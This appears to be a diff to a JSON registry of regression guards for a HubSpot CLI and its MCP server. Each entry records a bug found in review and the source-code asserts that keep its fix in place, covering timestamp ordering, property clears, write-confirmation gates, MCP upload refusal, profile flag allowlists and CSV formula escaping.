+   "why": "2026-10-24 factory Codex review round 2: HubSpot date-times (SimplePublicObject.updatedAt, ValueWithTimestamp.timestamp) arrive as RFC3339 with or without fractional seconds, and '.' sorts before 'Z', so \"2026-10-24T14:00:00.500Z\" sorts BEFORE \"2026-10-24T14:00:00Z\" as text. Failing inputs, each a test in hs_review_r2_time_test.go that fails on the pre-fix code: since 2026-10-24T14:00:00.900Z listed a deal updated at 14:00:00.500Z (the cutoff dropped its fraction); since --limit 1 put a 14:00:00Z deal ahead of a 14:00:00.500Z contact; engagements of listed the 14:00:00Z call before the 14:00:00.500Z call; live engagements of --since 2026-10-24T14:00:00Z dropped a call updated at 14:00:00.500Z and kept one with an empty updatedAt; notes signals reported last_note_at 14:00:00Z when a 14:00:00.500Z note existed; nurture-mine reported the stage of the 14:00:00Z deal as latest_deal_stage over the 14:00:00.500Z deal. Property history: the writer binds time.Time, which the driver stores as \"2026-10-24 14:00:00.5 +0000 UTC\"; that text happens to sort chronologically on its own, but a mirror row in HubSpot's RFC3339 shape sorts after every space-separated row on the same day, so meetings history put a 13:00Z row first, meetings ever-had counted a 08:00Z hit before --from 12:00Z as the first hit, and deals velocity took a 06:00Z transition as the latest over an 08:00 one. A bare julianday() fix would read every writer row as NULL and empty these commands; the history tests also fail under that mutation.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "return t.UTC().Format(time.RFC3339Nano)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "return hsTimeString(ts), nil",
+     "min_count": 3,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "not_contains": "Format(time.RFC3339), nil"
+    },
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "func hsTimeMillis(s string) (int64, bool) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "return t.Round(time.Millisecond).UnixMilli(), true",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "return okT && okC && t > c",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "func hsNewerFirst(a, b string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "func hsJulianSQL(col string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "\" WHEN instr(\" + col + \", ' +') > 0 THEN \" + zoned(\" +\") +",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/since.go",
+     "contains": "sort.SliceStable(rows, func(i, j int) bool { return hsNewerFirst(rows[i].UpdatedAt, rows[j].UpdatedAt) })",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/since.go",
+     "not_contains": "rows[i].UpdatedAt > rows[j].UpdatedAt"
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "sort.SliceStable(items, func(i, j int) bool { return hsNewerFirst(items[i].Timestamp, items[j].Timestamp) })",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "not_contains": "items[i].Timestamp > items[j].Timestamp"
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "if cutoff != \"\" && !hsTimeAfter(ts, cutoff) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "not_contains": "ts < cutoff"
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "ORDER BY julianday(ts) DESC",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "not_contains": "ORDER BY ts DESC"
+    },
+    {
+     "file": "cli/internal/cli/notes_signals.go",
+     "contains": "if a.LastNoteAt == \"\" || hsNewerFirst(n.TS, a.LastNoteAt) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/notes_signals.go",
+     "not_contains": "n.TS > a.LastNoteAt"
+    },
+    {
+     "file": "cli/internal/cli/nurture_mine.go",
+     "contains": "ORDER BY julianday(d.updated_at) DESC LIMIT 1",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nurture_mine.go",
+     "not_contains": "ORDER BY d.updated_at DESC"
+    },
+    {
+     "file": "cli/internal/cli/meetings_history.go",
+     "contains": "q += ` ORDER BY ` + hsJulianSQL(\"timestamp\") + ` DESC`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meetings_history.go",
+     "not_contains": "ORDER BY timestamp DESC"
+    },
+    {
+     "file": "cli/internal/cli/meetings_ever_had.go",
+     "contains": "jd := hsJulianSQL(\"timestamp\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meetings_ever_had.go",
+     "contains": "MIN(` + jd + `) AS first_hit_jd",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meetings_ever_had.go",
+     "contains": "AND ` + jd + ` >= julianday(?) AND ` + jd + ` < julianday(?)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meetings_ever_had.go",
+     "contains": "ORDER BY first_hit_jd DESC",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meetings_ever_had.go",
+     "contains": "hsTimeString(fromTS), hsTimeString(toTS)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meetings_ever_had.go",
+     "not_contains": "MIN(timestamp)"
+    },
+    {
+     "file": "cli/internal/cli/meetings_ever_had.go",
+     "not_contains": "timestamp >= ? AND timestamp < ?"
+    },
+    {
+     "file": "cli/internal/cli/meetings_ever_had.go",
+     "not_contains": "fromTS.UTC(), toTS.UTC()"
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "MAX(` + hsJulianSQL(\"timestamp\") + `) AS entered_jd",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "CAST((julianday('now') - h.entered_jd) AS INTEGER) AS days_in_stage",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "contains": "HAVING entered_jd IS NOT NULL",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "not_contains": "MAX(timestamp)"
+    },
+    {
+     "file": "cli/internal/cli/deals_velocity.go",
+     "not_contains": "substr(h.entered_at, 1, 19)"
+    }
+   ]
+  },
+  {
+   "id": "hubspot-explicit-clears-survive-merge",
+   "class": "wrong-result",
+   "summary": "Every property HubSpot explicitly returns in an object's top-level properties map (including \"\" and null) replaces the stored value on every merging write path: generic Upsert, typed Upsert<X>, UpsertBatch (sync pages, the sync --with-history fill, and the live-read and mutation-response write-through), so the resources row and the typed-table data column both carry the clear. A property absent from the response is still kept, and every other key keeps the generated keep-richer policy. The hook is one call in store.go mergeKeepRicherJSON; the rule lives in the hand-authored store/hs_authoritative_properties.go.",
+   "why": "Codex review r2 (P1 with-history snapshot): the generated keep-richer merge keeps the old non-empty value when the incoming value is \"\" or null, so a HubSpot clear never reached the store. Failing input: deal 1 stored with hubspot_owner_id 7 (an active owner), then `sync --resources hubspot-deals-crm --with-history hubspot_owner_id` returns propertiesWithHistory.hubspot_owner_id newest entry {\"value\":\"\",\"timestamp\":\"2026-10-24T14:00:00Z\",\"sourceType\":\"CRM_UI\"}; the deal stayed owned by 7 and `deals unowned --json` omitted it. The same loss hit a regular sync returning \"hubspot_owner_id\":\"\" or null in properties, and the write-through of a PATCH response after `patch ... --properties '{\"hubspot_owner_id\":\"\"}'` (HubSpot documents clearing a property by passing \"\"). Tests: TestR2HistoryClearSurvivesTheStoreMerge, TestR2HistoryClearShowsInDealsUnowned, TestR2ReturnedPropertyClearSurvivesTheStoreMerge, TestR2PatchClearReachesTheLocalMirror (internal/cli), TestAuthoritativePropertiesSurviveEveryUpsertPath, TestMergeKeepRicherJSONHubSpotPropertiesScope (internal/store).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "json.Marshal(applyAuthoritativeProperties(mergeKeepRicherValue(resourceType, existingVal, incomingVal), incomingVal))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "json.Marshal(mergeKeepRicherValue(resourceType, existingVal, incomingVal))"
+    },
+    {
+     "file": "cli/internal/store/hs_authoritative_properties.go",
+     "contains": "func applyAuthoritativeProperties(merged, incoming any) any {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hs_authoritative_properties.go",
+     "contains": "const hubspotPropertiesKey = \"properties\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hs_authoritative_properties.go",
+     "contains": "mergedProps[name] = value",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hs_authoritative_properties_test.go",
+     "contains": "func TestAuthoritativePropertiesSurviveEveryUpsertPath(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/hs_authoritative_properties_test.go",
+     "contains": "func TestMergeKeepRicherJSONHubSpotPropertiesScope(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r2_history_test.go",
+     "contains": "func TestR2HistoryClearSurvivesTheStoreMerge(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r2_history_test.go",
+     "contains": "func TestR2HistoryClearShowsInDealsUnowned(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r2_history_test.go",
+     "contains": "func TestR2ReturnedPropertyClearSurvivesTheStoreMerge(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r2_history_test.go",
+     "contains": "func TestR2PatchClearReachesTheLocalMirror(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "cli-writes-require-yes",
+   "class": "write-safety",
+   "summary": "Every CLI command that changes the HubSpot portal (each endpoint command whose method is not GET/HEAD/OPTIONS, a missing or unknown method included, plus import) refuses before any client exists unless --yes (send) or --dry-run (preview) is typed: exit 2, and under --json/--agent a JSON envelope with confirmation_required. The only exemption is an exact pp:path allowlist of POSTs that read (object search and batch read, property and association batch read, list search, list membership batch read). A --yes saved in a run profile does not count. Gated commands' help examples are rewritten to carry --dry-run / --yes. contacts bulk-update keeps its own --yes and digest gate.",
+   "why": "Fleet precedent (huntress, Codex round 1, 2026-10-24): generated endpoint commands sent writes on first run while the MCP twin (hubspot_execute) already required confirm=true. The tree-walk test covers every write endpoint, present or added by a future reprint.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "if err := enforceWriteConfirmation(cmd, flags); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "func enforceWriteConfirmation(cmd *cobra.Command, flags *rootFlags) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate.go",
+     "contains": "\"import\": \"a POST for every record in its input\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate_test.go",
+     "contains": "func TestEveryWriteCommandRefusesWithoutConfirmation(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "import-posts-to-create-endpoints",
+   "class": "write-safety",
+   "summary": "import sends each record to the object's single-record create endpoint (POST /crm/v3/objects/<object>); lists and imports, which have no JSON create-one-record endpoint, are refused. A test checks every mapped path against the command tree's own create endpoints.",
+   "why": "The press picked the first POST per resource, which for 12 objects is batch/archive: `import hubspot-deals-crm --input deals.jsonl` archived deals instead of creating them (shipped that way on main).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "contains": "\"hubspot-deals-crm\":      \"/crm/v3/objects/0-3\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "not_contains": "/batch/archive\","
+    },
+    {
+     "file": "cli/internal/cli/write_confirm_gate_test.go",
+     "contains": "func TestImportTargetsAreCreateEndpoints(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-no-file-uploads",
+   "class": "mcp-host-path",
+   "summary": "No MCP tool uploads a file. hubspot_execute refuses a multipart endpoint (HubSpot's CRM file import, POST /crm/v3/imports) before any preview or request; the endpoint table advertises no file parameter; and resolveMCPMultipartFile reads an MCP value only as base64 content, with the press's opt-in upload-root path mode (HUBSPOT_MCP_UPLOAD_ROOT) removed, so no MCP argument ever names a host file. File imports run with the CLI. hubspot_search describes the endpoint as CLI-only instead of advertising a base64 upload.",
+   "why": "Press 4.34.0 newly emits FileParams on the CRM import endpoint plus an env-opted path mode; the 2026-10-22 security work order holds any newly emitted MCP file-upload parameter, the threat model makes a host file read from an MCP tool argument a P1, and 0.2.4 already promised that the MCP server never opens a local file for an upload.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "if ep.Multipart {\n\t\treturn mcplib.NewToolResultError(fmt.Sprintf(\"endpoint_id %q uploads a file, which MCP tools cannot do; run it with hubspot-cli instead\", id)), nil\n\t}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "not_contains": "FileParams:     []string{\""
+    },
+    {
      "file": "cli/internal/mcp/tools.go",
-     "not_contains": "multipartFileFields[binding.WireName] = fmt.Sprintf(\"%v\", v)"
+     "not_contains": "HUBSPOT_MCP_UPLOAD_ROOT"
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "os.OpenRoot("
+    },
+    {
+     "file": "cli/internal/mcp/hs_no_file_uploads_test.go",
+     "contains": "func TestExecuteRefusesFileUploadEndpoints(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "\"mcp\": \"file upload: not available over MCP (hubspot_execute refuses it); run this endpoint with hubspot-cli\",",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "profile-never-confirms",
+   "class": "write-safety",
+   "summary": "A run profile saves and applies only the flags on an explicit allowlist (runProfileAllowedFlags: output and format flags, read source and freshness, and filters that appear only on read commands). Every other flag, every approval flag (--yes, --confirm, --digest, any future one) included, is never saved (profile save names what it left out) and never applied (a profile file that carries one gets a stderr warning and the value is ignored), so no saved profile can approve, shape or redirect a write.",
+   "why": "Codex round 1 (publish lane, 2026-10-24): after `profile save always-yes --yes`, `contacts bulk-update --jsonl --profile always-yes` sent a live update without confirmation; the bulk-update gate read the profile-applied flags.yes. Codex round 2 (2026-10-26) repeated the class: reserving only yes still let a profile file's --confirm/--digest approve a 101-row bulk update. The denylist became an allowlist.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "if !runProfileAllowedFlags[name] || credentialLikeRunProfileFlag(name) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "if fl.Changed && runProfileAllowedFlags[fl.Name] {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "var runProfileAllowedFlags = map[string]bool{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "not_contains": "\"yes\": true"
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "not_contains": "\"confirm\": true"
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "not_contains": "\"digest\": true"
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_confirm_test.go",
+     "contains": "func TestR3ProfileConfirmDigestNeverApproveBulkUpdate(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-csv-formula-safe",
+   "class": "output-safety",
+   "summary": "printTabular's --csv branch (every hand-written novel command) passes each cell through terminalText and csvSafeCell, the generated writer's spreadsheet formula guard.",
+   "why": "Codex round 1 P2 (publish lane, 2026-10-24): a meeting titled =1+1 reached `meetings status-report --csv` unescaped.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "safe[i] = csvSafeCell(terminalText(w, cell))",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meetings-ever-had-value-any-case",
+   "class": "wrong-result",
+   "summary": "meetings ever-had matches --value case-insensitively (HubSpot stores meeting outcomes in upper case: SCHEDULED, NO_SHOW), and every doc example passes SCHEDULED.",
+   "why": "Adversarial review (publish lane, 2026-10-24): the documented `--value Scheduled` returned zero meetings against stored SCHEDULED history.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/meetings_ever_had.go",
+     "contains": "AND value = ? COLLATE NOCASE",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_meetings_test.go",
+     "contains": "func TestR3EverHadValueMatchesAnyCase(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-unknown-stage-probability-fails",
+   "class": "wrong-result",
+   "summary": "An unknown deal stage probability is never 0 (or the 0.5 queue default): deals forecast, deals top and nurture queue price every deal in the answer through one rule (dealStagePricer in hs_deal_state.go) and FAIL, naming the stages, the deals and the fetch command, when no stored deal pipeline gives the stage a readable 0..1 probability (pipelines never fetched, a stage added since, a stage with no or unreadable probability metadata). Stored pipelines are read through the one shared reader hsPipelineRowsSQL (see sync-collects-deal-pipelines), and the error names the sync that stores them.",
+   "why": "Codex review round 1 (2026-10-24) P1: on a fresh store, deal amount 10000 in qualifiedtobuy (HubSpot probability 0.4) made 'deals forecast --json' report total_weighted 0 because sync omits pipelines and the loader returned an empty map successfully (tools-manifest.json:1638, :4540). The pre-fix remediation text 'sync --resources hubspot-pipelines-crm' is an unknown sync resource, and the live read's write-through lands in the generic resources table, so the loader had to read it for the named fix to work. Tests: TestR3DataForecastRefusesUnknownStageProbability, TestR3DataForecastRefusesStageMissingFromStoredPipelines, TestR3DataForecastMonthPricesOnlyItsDeals, TestR3DataDealsTopRefusesUnknownStageProbability, TestR3DataNurtureQueueRefusesUnknownStageProbability, TestR3DataPipelineFetchCommandFillsTheStore.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "if s.StageID != \"\" && s.HasProbability {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "if hasProb && (prob < 0 || prob > 1) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "func (p *dealStagePricer) err(command string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "const hsDealPipelinesSyncCmd = \"hubspot-cli sync --resources hubspot-pipelines-crm,hubspot-deals-crm\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "WHERE r.resource_type IN ('hubspot-pipelines-crm', 'hubspot_pipelines_crm')",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "FROM (` + hsPipelineRowsSQL + `) p, json_each(p.data, '$.stages') st",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "rows, err := db.DB().Query(`SELECT id, data, archived FROM (` + hsPipelineRowsSQL + `) ORDER BY id`)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "not_contains": "_, _ = fmt.Sscanf(x, \"%f\", &prob)"
+    },
+    {
+     "file": "cli/internal/cli/deals_forecast.go",
+     "contains": "weighted := amount * pricer.price(stage, \"deal \"+id)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_forecast.go",
+     "contains": "if err := pricer.err(\"deals forecast\"); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_forecast.go",
+     "not_contains": "prob := stageProb[stage]"
+    },
+    {
+     "file": "cli/internal/cli/deals_top.go",
+     "contains": "probability := pricer.price(stageStr, \"deal \"+nullStr(id))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_top.go",
+     "contains": "if err := pricer.err(\"deals top\"); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_top.go",
+     "not_contains": "probability := stageProb[stageStr]"
+    },
+    {
+     "file": "cli/internal/cli/nurture_queue.go",
+     "contains": "if err := pricer.err(\"nurture queue\"); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nurture_queue.go",
+     "not_contains": "if p, ok := stageProb[c.LatestDealStage]; ok {"
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataForecastRefusesUnknownStageProbability(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataForecastRefusesStageMissingFromStoredPipelines(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataDealsTopRefusesUnknownStageProbability(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataNurtureQueueRefusesUnknownStageProbability(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataPipelineFetchCommandFillsTheStore(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-uncollected-associations-never-confident",
+   "class": "wrong-result",
+   "summary": "This build's sync never writes hubspot_associations, so zero association rows means never collected, not none: contacts win-back (whose whole answer is the contact-to-deal join) refuses; notes signals --pipeline refuses; engagements of --data-source local refuses; deals top (note_signals), nurture-mine (open_deals, with deal_count / latest_deal_stage / top_deal_amount null, not zero), nurture queue (deal_ranking, top_deal_amount / top_deal_stage null) and notes signals (deal_grouping) answer with an always-present not_computed list and warnings list in the JSON envelope (hsReportGaps) plus a stderr warning.",
+   "why": "Codex review round 1 (2026-10-24) P1: contact 1 with notes_last_contacted and associations.deals.results [{id 2, contact_to_deal}] plus closed-won deal 2 made 'contacts win-back --cold-days 90 --json' return [] successfully, because no production code populates hubspot_associations (tools-manifest.json:1261-1294); the same gap silently removed deal-based ranking from the nurture reports. Tests: TestR3DataWinBackRefusesWithoutAssociations, TestR3DataDealsTopMarksMissingNoteSignals, TestR3DataNurtureMineMarksUnknownDeals, TestR3DataNurtureQueueMarksMissingDealRanking, TestR3DataNotesSignalsMarksMissingDealGrouping, TestR3DataEngagementsLocalRefusesWithoutAssociations.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/contacts_win_back.go",
+     "contains": "return nil, fmt.Errorf(\"contacts win-back needs contact-to-deal associations",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/notes_signals.go",
+     "contains": "return fmt.Errorf(\"notes signals --pipeline needs note-to-deal associations",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/notes_signals.go",
+     "not_contains": "emitting unfiltered per-note rows"
+    },
+    {
+     "file": "cli/internal/cli/notes_signals.go",
+     "contains": "gaps.associationGap(cmd, \"deal_grouping\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "return nil, \"\", fmt.Errorf(\"engagements of --data-source local needs engagement associations",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deals_top.go",
+     "contains": "gaps.associationGap(cmd, \"note_signals\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nurture_mine.go",
+     "contains": "gaps.associationGap(cmd, \"open_deals\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nurture_mine.go",
+     "contains": "r.DealCount, r.LatestDealStage, r.TopDealAmount = &dealCount, &latest, &top",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nurture_queue.go",
+     "contains": "gaps.associationGap(cmd, \"deal_ranking\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "v[\"not_computed\"] = g.NotComputed",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "fmt.Fprintln(cmd.ErrOrStderr(), \"warning: \"+msg)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataWinBackRefusesWithoutAssociations(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataDealsTopMarksMissingNoteSignals(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataNurtureMineMarksUnknownDeals(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataNurtureQueueMarksMissingDealRanking(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataNotesSignalsMarksMissingDealGrouping(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
+     "contains": "func TestR3DataEngagementsLocalRefusesWithoutAssociations(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-live-timeline-walks-every-page",
+   "class": "wrong-result",
+   "summary": "engagements of (live) walks every page of each association list (limit 500, paging.next.after until no next page), fails on any list-page, decode, per-type or per-record read failure, on a cursor that does not advance and on a 200-page cap, and never reports a partial timeline. toObjectId is read verbatim (an 11-digit id decoded as float64 became 5.123456789e+10), and an unknown or empty --type is a usage error instead of a silently skipped type. The hand-written novel commands were searched for other live paged reads: engagements_of.go is the only one (contacts_bulk_update.go POSTs batches; doctor_verdict.go is a single probe).",
+   "why": "Codex review round 1 (2026-10-24) P1: 'engagements of contact:1 --type calls --since 2026-10-01 --json' where page one held 500 older calls and paging.next.after led to call 501 updated October 24 fetched only page one and successfully reported no recent calls (tools-manifest.json:204-239); list and record errors were 'continue'd the same way. Tests: TestR3DataEngagementsLiveWalksEveryAssociationPage, TestR3DataEngagementsLiveFailsOnAnyReadFailure, TestR3DataEngagementsLivePagingCapFails, TestR3DataEngagementsUnknownTypeRefused.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "if resp.Paging == nil || resp.Paging.Next == nil || resp.Paging.Next.After == \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "params[\"after\"] = after",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "if page > hsAssocMaxPages {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "ids, err := listAssociatedIDs(ctx, c, targetType, targetID, info.Path)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "return nil, fmt.Errorf(\"reading %s %s associated with %s %s: %w\", et, id, targetType, targetID, err)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "engTypes, err = parseEngagementTypes(typesCSV)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "ToObjectID json.RawMessage `json:\"toObjectId\"`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "not_contains": "ToObjectID any `json:\"toObjectId\"`"
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "not_contains": "body, err := c.Get(ctx, listPath, nil)"
+    },
+    {
+     "file": "cli/internal/cli/hs_review_r3_data_test.go",
